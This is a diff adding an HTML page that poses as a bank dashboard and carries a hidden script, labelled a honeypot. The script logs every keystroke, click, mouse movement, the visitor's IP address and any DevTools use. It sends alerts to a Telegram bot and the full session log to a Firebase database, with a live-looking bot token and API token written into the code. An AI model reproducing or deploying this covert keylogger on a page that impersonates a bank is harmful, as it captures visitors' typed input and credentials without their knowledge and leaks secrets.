@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure National Bank - Dashboard</title>
+  <link rel="stylesheet" href="style.css" />
+  
+</head>
+<body>
+
+  <header>
+    <h1>🏦 Welcome Back, Client</h1>
+  </header>
+
+  <main>
+    <section class="hero">
+      <h2>Account Summary</h2>
+      <p>Your balance: $10,000.00</p>
+      <p>Last login: Just now</p>
+    </section>
+
+    <section>
+      <h3>Recent Activity</h3>
+      <ul>
+        <li>💸 Transfer: -$500 to John</li>
+        <li>📥 Deposit: +$2,000</li>
+        <li>🛍️ Purchase: -$89.99 at Amazon</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer>
+    <p>&copy; 2025 Secure National Bank</p>
+  </footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
+ <script>
+const firebaseURL = "https://honeypot-715b9-default-rtdb.firebaseio.com/honeypot_logs.json";
+const telegramToken = "8389627211:AAGq6tuHxuLKX9m4AQR-ljj77z-GjKrpIig";
+const chatID = "1919975349";
+
+const sessionData = {
+  ip: "",
+  mouseMoves: [],
+  clicks: [],
+  keys: [],
+  openedDevTools: false,
+  startTime: Date.now()
+};
+
+let notifiedClick = false;
+let notifiedKey = false;
+let notifiedDevTools = false;
+
+// 🖱️ Mouse click
+document.addEventListener("click", e => {
+  sessionData.clicks.push({ x: e.clientX, y: e.clientY, t: Date.now() });
+  if (!notifiedClick) {
+    sendLiveTelegram("Mouse click detected");
+    notifiedClick = true;
+  }
+});
+
+// ⌨️ Key press
+document.addEventListener("keydown", e => {
+  sessionData.keys.push({ key: e.key, t: Date.now() });
+  if (!notifiedKey) {
+    sendLiveTelegram("Key press detected");
+    notifiedKey = true;
+  }
+});
+
+// 🛠️ DevTools detection
+setInterval(() => {
+  const start = performance.now();
+  debugger;
+  const duration = performance.now() - start;
+  if (duration > 100 && !notifiedDevTools) {
+    sessionData.openedDevTools = true;
+    sendLiveTelegram("🚨 DevTools opened!");
+    notifiedDevTools = true;
+  }
+}, 1000);
+
+// 🌍 IP Info
+fetch("https://ipinfo.io/json?token=27824af3b12c98")
+  .then(res => res.json())
+  .then(ipData => {
+    sessionData.ip = ipData.ip;
+  });
+
+// ⏱️ Exit tracking
+window.addEventListener("beforeunload", () => {
+  sessionData.duration = ((Date.now() - sessionData.startTime) / 1000).toFixed(1);
+  sendToFirebase(sessionData);
+});
+
+// 🔥 Send to Firebase
+function sendToFirebase(data) {
+  fetch(firebaseURL, {
+    method: "POST",
+    body: JSON.stringify(data)
+  }).then(() => console.log("✔️ Log sent to Firebase"));
+}
+
+// 📬 Send instant Telegram alerts
+function sendLiveTelegram(msg) {
+  const message = `⚠️ *Honeypot Alert*  
+${msg}  
+IP: \`${sessionData.ip || 'pending'}\``;
+
+  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatID,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  }).then(() => console.log("📬 Live alert sent"));
+}
+</script>
+
+
+</body>
+</html>
